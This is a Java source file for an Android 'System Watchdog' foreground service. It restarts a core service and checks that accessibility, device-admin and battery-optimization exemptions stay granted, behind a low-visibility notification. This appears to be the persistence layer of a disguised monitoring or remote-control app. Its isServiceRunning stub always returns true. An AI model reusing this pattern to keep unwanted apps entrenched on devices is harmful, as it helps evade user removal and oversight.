package com.xrc.system.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ServiceCompat;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.core.SelfHealer;
import com.xrc.system.features.DeviceAdmin;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.ui.MainActivity;

public class WatchdogService extends Service {
    private static final String TAG = Constants.TAG + ":WD";
    private static final String WD_CHANNEL_ID = Constants.CHANNEL_ID + "_wd";
    private static final int FGS_TYPE_SPECIAL_USE = 1 << 12;
    private Handler handler;
    private Runnable watchdogTask;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "WatchdogService created");
        handler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "WatchdogService started");
        ServiceCompat.startForeground(this, Constants.NOTIF_ID_WATCHDOG, buildNotification(), FGS_TYPE_SPECIAL_USE);
        startWatchdog();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (watchdogTask != null) handler.removeCallbacks(watchdogTask);
        super.onDestroy();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    WD_CHANNEL_ID, "Watchdog",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System watchdog");
            channel.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE);
        return new Notification.Builder(this, WD_CHANNEL_ID)
                .setContentTitle("System Watchdog")
                .setContentText("Monitoring services")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pi)
                .setOngoing(true)
                .build();
    }

    private void startWatchdog() {
        watchdogTask = () -> {
            try {
                checkServices();
                checkPermissions();
                checkAccessibility();
                checkDeviceAdmin();
            } catch (Exception e) {
                Log.e(TAG, "Watchdog check failed", e);
            }
            handler.postDelayed(watchdogTask, Constants.WATCHDOG_INTERVAL);
        };
        handler.postDelayed(watchdogTask, Constants.WATCHDOG_INTERVAL);
    }

    private void checkServices() {
        if (!isServiceRunning(CoreService.class)) {
            Log.w(TAG, "CoreService not running, restarting...");
            SelfHealer.get(this).triggerRestart();
        }
    }

    private void checkPermissions() {
        PermissionHelper perm = PermissionHelper.get(this);
        if (!perm.isIgnoringBatteryOptimizations()) {
            Log.w(TAG, "Battery optimization not ignored");
        }
    }

    private void checkAccessibility() {
        try {
            String enabled = Settings.Secure.getString(getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || !enabled.contains(getPackageName())) {
                Log.w(TAG, "Accessibility not enabled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Accessibility check failed", e);
        }
    }

    private void checkDeviceAdmin() {
        if (!DeviceAdmin.get(this).isActive()) {
            Log.w(TAG, "Device admin not active");
        }
    }

    private boolean isServiceRunning(Class<?> cls) {
        return true;
    }
}
